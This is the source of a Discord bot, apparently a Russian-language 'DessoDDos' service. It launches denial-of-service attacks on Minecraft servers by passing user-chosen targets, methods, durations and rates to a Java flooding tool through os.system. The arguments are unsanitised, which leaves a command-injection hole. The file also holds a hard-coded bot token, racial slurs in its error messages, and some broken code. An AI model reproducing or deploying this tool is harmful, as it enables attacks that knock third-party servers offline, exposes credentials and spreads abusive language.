import discord
from discord.ext import commands
import os
import threading
import socket
import discord.utils
import requests
import urllib.request
import json
import time
import asyncio
import random
import sqlite3
import psutil
import mcstatus
import datetime
import getpass
import mcstatus
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory
from subprocess import Popen, TimeoutExpired, run
from discord import Member
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext import commands

token = "MTAzNDE3NTE2MTI5MDczNTcwNg.G5dk_J.a-K8i957R0x2y-9irIEHbE8jcQGZ-p7jtBO41Q"

methods_list = [
    'join', 'charonbot', 'localhost', 'invalidnames', 'longnames',
    'botjoiner', 'spoof', 'ping', 'multikiller', 'handshake',
    'bighandshake', 'query', 'bigpacket', 'network', 'randombytes',
    'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry',
    'colorcrasher', 'tcphit', 'botnet', 'tcpbypass',
    'ultimatesmasher', 'sf', 'nabcry','legitnamekiller', 'SmartBot'
]
protocols_list = [
    '758', '757', '757', '756', '754', '753', '751', '736', '736', '735',
    '578', '575', '573', '498', '490', '485', '480', '477', '404', '401',
    '393', '340', '338', '335'
]
starbot_channel_id = 1034174687921573978
protocols_channel_id = 1034174687921573978
methods_channel_id = 1034174687921573978

blocked_text = ['dsc.gg', 'dsc,gg', 'discord','https://discord.gg/']

raffik = commands.Bot(command_prefix = ['$'], intents = discord.Intents.all())
raffik.remove_command('help')

@raffik.event
async def on_ready():
    activity = discord.Streaming(
        name="DessoDDos (By XXXs2) ",
        url="https://www.twitch.tv/directory/game/brawlhalla") 
    await raffik.change_presence(status=discord.Status.idle, activity=activity)
    print("[By XXXs2] bot is online"
          )  


@raffik.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**Команды нету, либо ты негр !**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Команда отправлена неправильно !**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)


@raffik.command(aliases=['resolve', 'ipr'])    
async def __resolve__(ctx, domain):
    domain=urllib.parse.quote_plus(domain)
    url = "http://abcvg.com/minecraftstatus.html" + domain
    file = requests.get(url).text
    json_object = json.loads(file)
    __ip__ = json_object["ip"]
    __port__ = json_object["port"]
    __iport__ = f"{__ip__}:{__port__}"
    if __iport__ == "127.0.0.1:25565":
        await ctx.reply(":warning: Кажется такого сервера нету, либо стоит защита.")
        return
    else:
        try:
            embed = nextcord.Embed(title="Успешно!",color=nextcord.Colour.dark_purple())
            embed.add_field(name='IP:', value=json_object["ip"], inline=True)
            embed.add_field(name='Port:', value=json_object["port"], inline=True)
            embed.add_field(name="Host:", value=json_object["hostname"] if "hostname"in json_object.keys() else "N/A", inline=True)
            embed.add_field(name="Protocol:", value=json_object["protocol"]if "protocol" in json_object.keys() else "N/A", inline=True)
            embed.add_field(name="Version:", value=json_object["version"] if "version" in json_object.keys() else "N/A", inline=True)
            embed.add_field(name="Players:", value=json_object["players"]["online"]if "online" in json_object.keys() else "N/A", inline=True)
            embed.add_field(name="MOTD:", value="\n".join(json_object["motd"]["clean"]), inline=True)
            embed.set_footer(text="DessoDDos")
            
            await ctx.reply(embed=embed)
        except Exception as e:
            print(e)
            await ctx.reply("Не удалось получить данные о сервере")


@raffik.command()
async def help(ctx):
  if ctx.message.channel.id != starbot_channel_id:
    embed = discord.Embed(title="Menu", color=discord.Colour.random())
    embed.add_field(
        name='Запустить Атаку',
        value='$attack <ip:port> <protocol> <method> <time> <cps>',
        inline=False)
    embed.add_field(name=' Методы🎉', value='$methods', inline=False)
    embed.add_field(name=' Протоколы🔒', value='$protocols', inline=False)
    embed.add_field(name=' Узнать Айпи🌎', value='$resolve', inline=False)
    embed.add_field(name=' stop⚡️', value='$stop', inline=False)
    embed.set_footer(text='help🎯') ,
    await ctx.send(embed=embed)


@raffik.command()
async def protocols(ctx):
    if ctx.message.channel.id != protocols_channel_id:
        em = discord.Embed(
            title=f"DessoDDos",
            description=f"команда Работает В Канале 🎯・ddos",
            color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(title="версия - протокол",
                          color=discord.Colour.blue())
    embed.add_field(name='**1.18.2**:', value='758', inline=True)
    embed.add_field(name='**1.18.1**:', value='757', inline=True)
    embed.add_field(name='**1.18**:', value='757', inline=True)
    embed.add_field(name='**1.17.1**:', value='756', inline=True)
    embed.add_field(name='**1.16.5**:', value='754', inline=True)
    embed.add_field(name='**1.16.3**:', value='753', inline=True)
    embed.add_field(name='**1.16.2**:', value='751', inline=True)
    embed.add_field(name='**1.16.1**:', value='736', inline=True)
    embed.add_field(name='**1.16**:', value='735', inline=True)
    embed.add_field(name='**1.15.2**:', value='578', inline=True)
    embed.add_field(name='**1.15.1**:', value='575', inline=True)
    embed.add_field(name='**1.15**:', value='573', inline=True)
    embed.add_field(name='**1.14.4**:', value='498', inline=True)
    embed.add_field(name='**1.14.3**:', value='490', inline=True)
    embed.add_field(name='**1.14.2**:', value='485', inline=True)
    embed.add_field(name='**1.14.1**:', value='480', inline=True)
    embed.add_field(name='**1.14**:', value='477', inline=True)
    embed.add_field(name='**1.13.2**:', value='404', inline=True)
    embed.add_field(name='**1.13.1**:', value='401', inline=True)
    embed.add_field(name='**1.13**:', value='393', inline=True)
    embed.add_field(name='**1.12.2**:', value='340', inline=True)
    embed.set_footer(text="DessoDDos протоколы")
    await ctx.send(embed=embed)


@raffik.command()
async def methods(ctx):
  if ctx.message.channel.id != methods_channel_id:
        em = discord.Embed(
            title=f"DessoDDos",
            description=f"команда Работает В Канале 🎯・ddos",
            color=ctx.author.color)
        await ctx.send(embed=em)
        return
embed = discord.Embed(title="Methods", color=discord.Colour.green())
embed.add_field(name='Methods:',
                    value=', '.join([i for i in methods_list]),
                    inline=True)
embed.set_footer(text="XXXs2")


@raffik.command()
async def raffibro2020(ctx):
    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"Эта Команда работаеть В Канале 🎯・ddos",
                           color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(title="XXXs2#0682", color=discord.Colour.blue())
    embed.add_field(name='**XXXs2#0682**:',
                    value='XXXs2#0682',
                    inline=True)
    embed.set_footer(text="XXXs2#0682")
    await ctx.send(embed=embed)

@raffik.command()
async def Raffik(ctx):
    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"ты банан",
                           color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(title="XXXs2#0682,", color=discord.Colour.blue())
    embed.add_field(name='**XXXs2#0682,**:',
                    value='XXXs2#0682',
                    inline=True)
    embed.set_footer(text="XXXs2#0682")
    await ctx.send(embed=embed)

@raffik.command()
async def attack(ctx, arg1, arg2, arg3, arg4, arg5):

    def attack():
        os.system(f"java -jar StarDDoSByraffik.jar {arg1} {arg2} {arg3} {arg4} {arg5}")
        os.system(f"")

    embed = discord.Embed(title='DessoDDos ',
                          description=f'Атакa By {ctx.author.mention}',
                          color=discord.Colour.blue())

    embed.add_field(name='🎉айпи:', value=f'{arg1}', inline=False)
    embed.add_field(name=' 🔥Протокол:', value=f'{arg2}', inline=False)
    embed.add_field(name='  ⚡️Метод:', value=f'{arg3}', inline=False)
    embed.add_field(name='   🌎Время:', value=f'{arg4}', inline=False)
    embed.add_field(name='    🔒Скорость:', value=f'{arg5}', inline=False)
    embed.set_image(
        url=
        f'https://c.tenor.com/2ASEP-BmFh0AAAAC/boom-world-explodes.gif'
    )
    embed.set_footer(text="DessoDDos")
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)
    if json_object["online"] == False:
        emb = discord.Embed(color=discord.Color.red())
        emb.add_field(name='Ошибка!',
                      value='**Сервер выключен либо ты лох**')
        emb.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=emb)
        return

    if str(arg2) not in protocols_list:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**не правильный протокол! либо ты пингвин!**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if arg3 not in methods_list:
        em = discord.Embed(title=f"Ошибка.",
                           description=f"**Метод не найден либо ты страус! - $methods**",
                           color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != starbot_channel_id:
        em = discord.Embed(
            title=f"Ошибка.",
            description=f"**не тот канал #🎯・ddos .**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg4) > 60:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты негр, используй от 1 - 60 секунд.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    if int(arg5) > 5000 or int(arg5) < 1:
        em = discord.Embed(
            title=f"Ошибка.",
            description=
            f"**ты банан, используй от 1 - 5000.**",
            color=ctx.author.color)
        em.set_image(url=f'https://media.discordapp.net/attachments/1015249886129700898/1021690060174794752/image_processing20190818-32750-8v6g4s_1.gif')
        await ctx.send(embed=em)
        return

    raffik = threading.Thread(target=attack)

    raffik.start()

    await ctx.send(embed=embed)


raffik.run(token)